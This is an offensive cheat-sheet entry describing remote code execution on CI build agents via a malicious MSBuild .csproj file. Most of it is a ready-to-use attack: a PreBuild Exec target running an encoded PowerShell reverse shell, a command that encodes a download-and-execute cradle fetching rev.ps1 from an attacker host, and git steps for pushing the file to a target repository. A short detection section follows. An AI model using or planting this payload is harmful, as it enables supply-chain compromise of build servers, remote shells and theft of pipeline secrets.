# MSBuild .csproj PreBuild RCE

MSBuild executes `<Exec>` commands in project files during build. If a CI/CD pipeline clones and builds an attacker-controlled repo, malicious `.csproj` fires as the build agent user.

## Payload in .csproj

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell -e <BASE64_REVSHELL>" />
  </Target>
</Project>
```

## Generate Base64 Payload

```bash
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/rev.ps1")' | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

## Push to Target Repo

```bash
git add malicious.csproj
git commit -m "add project"
git push
```

When CI clones and runs `dotnet build` or `msbuild`, the PreBuild target fires.

## Detection

- Look for `<Exec>` or `<Exec Command=` in `.csproj`, `.targets`, `.props` files in repos
- Also check `Directory.Build.targets` and `Directory.Build.props` — loaded automatically from any parent directory

## Notes

- Works with any CI that runs `dotnet build`, `msbuild`, or `dotnet publish`
- `AfterTargets="PostBuildEvent"` is an alternative trigger
- Command runs in the CI agent's security context (often SYSTEM or a service account)
